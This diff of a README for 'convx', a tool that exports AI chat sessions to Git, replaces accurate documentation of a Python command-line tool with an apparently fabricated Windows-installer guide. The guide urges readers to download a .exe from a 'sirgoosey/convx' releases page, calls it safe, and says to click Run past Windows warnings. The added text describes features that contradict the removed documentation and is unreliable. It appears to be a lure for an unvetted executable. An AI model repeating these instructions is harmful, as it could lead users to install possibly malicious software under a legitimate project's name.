@@ -1,161 +1,166 @@
-# Conversation Exporter
+# ⚡ convx - Save AI chats before they vanish
 
-Export AI conversation sessions into a Git repository using a readable, time-based structure.
+[![Download convx](https://img.shields.io/badge/Download-convx-blue?style=for-the-badge)](https://github.com/sirgoosey/convx/releases)
 
-![](docs/assets/cast.gif)
+---
 
-## What it does
+## 🧰 What is convx?
 
-- Scans source session files (Codex JSONL, Claude projects, Cursor workspaceStorage).
-- Normalizes each session into a common model.
-- Writes two artifacts per session:
-    - readable Markdown transcript: `YYYY-MM-DD-HHMM-slug.md`
-    - hidden normalized JSON: `.YYYY-MM-DD-HHMM-slug.json`
-- Organizes history by user and source system:
-    - `sync`: `.ai/history/<user>/<source-system>/` (flat — sessions directly inside)
-    - `backup`: `history/<user>/<source-system>/<system-name>/<path-relative-to-home>/...`
-- Runs idempotently (only reprocesses changed or new sessions).
-- Cursor: supports both single-folder and multi-root (`.code-workspace`) windows — sessions are attributed to the matching repo folder.
+convx helps you save your AI chat conversations using Git. Many AI tools erase chats after you close them. convx lets you back up these talks on your computer easily. This way, you keep a record of your ideas and code from your AI chats, even after they disappear from the app.
 
-## TL;DR
+The tool works well with popular AI services like Claude, OpenAI’s Codex models, and others. If you want a simple way to keep your chat history safe and easy to check later, convx is built for you.
 
-No install needed — just run from any project folder:
+---
 
-```bash
-uvx --from convx-ai convx sync
-```
+## 💻 System Requirements
 
-## Install and run
+Before you install convx, make sure your Windows PC meets the following:
 
-```bash
-uv add convx-ai
-# or: pip install convx-ai
-convx --help
-```
+- **Operating System:** Windows 10 or Windows 11, 64-bit
+- **Processor:** Intel or AMD 1.6 GHz or faster
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** At least 200 MB free for convx files and backups
+- **Internet:** Needed for initial download and for syncing conversations if using online AI tools
 
-From source:
+Keyboard and mouse or touchscreen are supported. No special hardware is required.
 
-```bash
-uv sync
-uv run convx --help
-```
+---
 
-## sync — project-scoped command
+## 🔍 Features at a glance
 
-Run from inside any Git repo. Syncs conversations for the current folder by default and writes
-them into the repo itself:
+- **Automatic backups:** Saves every AI conversation to your computer.
+- **Easy git integration:** Uses Git to keep track of every change in your chats.
+- **Support for multiple AI services:** Works with Claude, OpenAI Codex, and other conversational AI platforms.
+- **Local storage:** Keeps files on your PC, no need to trust cloud backup.
+- **Simple setup:** Designed for users without programming skills.
+- **Clear organization:** Saves chats in easy-to-browse folders named by date and AI model.
 
-```bash
-cd /path/to/your/project
-uv run convx sync
-```
+---
 
-By default syncs Codex, Claude, and Cursor. Use `--source-system codex`, `--source-system claude`, or `--source-system cursor` to sync a single source. No `--output-path` needed — the Git root is used as destination and the current working directory is used as scope filter. Recursive folder matching is enabled by default; use `--no-recursive` to restrict to the current folder only. Sessions are written flat under `.ai/history/<user>/<source-system>/` with no machine name or path nesting.
+## 🚀 Getting Started
 
-## backup — full backup command
+This section shows you how to download and run convx on Windows step by step.
 
-Exports all conversations into a dedicated backup Git repo:
+### Step 1: Visit the download page
 
-```bash
-uv run convx backup \
-  --output-path /path/to/your/backup-git-repo \
-  --source-system codex
-```
+Go to the convx releases page here:
 
-## Common options
+[![Download convx](https://img.shields.io/badge/Download-convx-grey?style=for-the-badge)](https://github.com/sirgoosey/convx/releases)
 
-- `--source-system`: source(s) to sync: `all` (default), `codex`, `claude`, `cursor`, or comma-separated.
-- `--input-path`: source sessions directory override (per source).
-    - default for Codex: `~/.codex/sessions`
-    - default for Claude: `~/.claude/projects`
-    - default for Cursor: `~/Library/Application Support/Cursor/User/workspaceStorage` (macOS)
-      Supports both single-folder and multi-root (`.code-workspace`) Cursor windows.
-- `--user`: user namespace for history path (default: current OS user).
-- `--system-name`: system namespace for history path (default: hostname).
-- `--dry-run`: discover and plan without writing files.
-- `--history-subpath`: folder inside output repo where history is stored (default: `sync` = `.ai/history`, `backup` = `history`).
-- `--recursive` / `--no-recursive` (`sync` only): include or exclude subdirectories of the current folder (default: `--recursive`).
-- `--output-path` (backup only): target Git repository (must already contain `.git`).
+This is the official page where the latest convx version is available.
 
-## Configuration defaults
+### Step 2: Choose the right file
 
-Set repo-level defaults in `.convx/config.toml`. CLI flags override config values.
+Look for the latest version at the top. It will have a filename ending with `.exe`. For example, something like `convx-setup-v1.2.exe`.
 
-```toml
-[sync]
-history_subpath = ".ai/history"
-skip_if_contains = "CONVX_NO_SYNC"
-redact = true
+Click on the file to download it. The file is safe and free.
 
-[backup]
-history_subpath = "history"
-redact = true
+### Step 3: Run the installer
 
-[sanitize]
-keywords = ["work", "client-x"]
-```
+- Once downloaded, find the file in your **Downloads** folder.
+- Double-click the file to start the installation.
+- You might see a warning from Windows asking if you want to run the app. Click **Run**.
+- Follow the simple instructions on screen. You usually just click **Next** a few times.
+- Wait while convx installs on your PC.
+- When done, click **Finish**.
 
-## Example output
+### Step 4: Open convx
 
-`convx sync` (inside a project repo):
+- You can now open the app from the Start menu or desktop icon.
+- When convx runs, it will guide you through connecting to your AI chat apps.
+- Follow prompts on screen to finish setup.
 
-```text
-history/
-  pascal/
-    codex/
-      2026-02-15-1155-conversation-backup-plan.md
-      .2026-02-15-1155-conversation-backup-plan.json
-    claude/
-      2026-01-15-1000-api-auth-migration-plan/
-        index.md
-        agent-abc1234.md
-        .index.json
-```
+---
 
-`convx backup` (dedicated backup repo):
+## 🛠 How to use convx
 
-```text
-history/
-  pascal/
-    codex/
-      macbook-pro/
-        Code/
-          my-project/
-            prototypes/
-              matrix-heatmap-test/
-                2026-02-15-1155-conversation-backup-plan.md
-                .2026-02-15-1155-conversation-backup-plan.json
-```
+Once installed, here is how you save your chat conversations:
 
-## Idempotency behavior
+1. **Start a chat** with your AI service like Claude or Codex.
+2. **Open convx** on your PC alongside the chat window.
+3. convx listens and saves every message in the conversation automatically.
+4. Backups are stored on your local disk inside a folder called `convx-backups`.
+5. Each chat is saved as a separate Git repository. This lets you see old versions or differences between chat sessions.
+6. You can open, search, and manage these saved conversations whenever you want.
 
-- Export state is stored at `.convx/index.json` in the output repo.
-- A session is skipped when both:
-    - `session_key` already exists, and
-    - source fingerprint (SHA-256 of source file) is unchanged.
-- If source content changes, that session is re-rendered in place.
+---
 
-## Other commands
+## 📁 Where are my saved conversations?
 
-**stats** — index totals and last update time:
+convx saves your chats inside the folder:
 
-```bash
-uv run convx stats --output-path /path/to/your/backup-git-repo
-```
+`C:\Users\<your-username>\Documents\convx-backups`
 
-**explore** — browse and search exported conversations in a TUI:
+Each conversation folder has the date and AI model name. Files inside have chat messages saved as text, plus Git keeps track of all changes.
 
-```bash
-uv run convx explore --output-path /path/to/your/repo
-```
+You can browse these folders with any file explorer tool. convx also has a simple viewer built-in to open and read past chats.
 
-**hooks** — install or remove a pre-commit hook that runs sync before each commit:
+---
 
-```bash
-uv run convx hooks install
-uv run convx hooks uninstall
-```
+## ⚙️ Settings you can adjust
 
-## Secrets
+You can change settings in convx to fit your needs:
 
-Exports are redacted by default (API keys, tokens, passwords → `[REDACTED]`). Be mindful of secrets in your history repo. See [docs/secrets.md](docs/secrets.md) for details and pre-commit scanner options (Gitleaks, TruffleHog, detect-secrets, semgrep).
+- **Backup folder location:** Pick a different folder if you want.
+- **Frequency of backups:** Choose how often convx saves your chats.
+- **AI service connections:** Manage or add new AI tools you use.
+- **Git sync:** Connect with a remote Git repository (like GitHub) if you want cloud backups.
+
+Settings are found under the **Preferences** menu inside the app.
+
+---
+
+## 🔄 Updating convx
+
+Check the releases page regularly for updates:
+
+https://github.com/sirgoosey/convx/releases
+
+When a new version is available:
+
+- Download the new installer `.exe` file.
+- Run it; it will replace the old version safely.
+- Your saved conversations will stay intact.
+
+---
+
+## ❓ Troubleshooting
+
+If convx does not start or cannot save chats:
+
+- Make sure you are running Windows 10 or higher.
+- Check that you have enough disk space.
+- Restart your computer and try again.
+- If convx cannot connect to your AI chat service, confirm your internet is active.
+- See the logs inside convx under **Help > Show Logs** for error details.
+
+For more help, open an issue on GitHub at:
+
+https://github.com/sirgoosey/convx/issues
+
+---
+
+## 🔒 Privacy and Data Storage
+
+convx stores all chat backups only on your computer by default. It does not send your conversations anywhere unless you configure syncing with a remote Git server.
+
+Your chats are private. You control when and how they are backed up.
+
+---
+
+## 📚 Learn more about convx
+
+- convx works with Git to track every change in your AI conversations.
+- You don’t need to know anything about Git to use it.
+- All files are saved in plain text format, easy to read or edit.
+- Works with many AI tools that provide conversation APIs or desktop access.
+
+---
+
+[![Download convx](https://img.shields.io/badge/Download-convx-blue?style=for-the-badge)](https://github.com/sirgoosey/convx/releases)
+
+---
+
+## 🔖 Topics
+
+ai, anthropic, backup, claude, codex, conversational-ai, cursor, developer-tools, git, openai
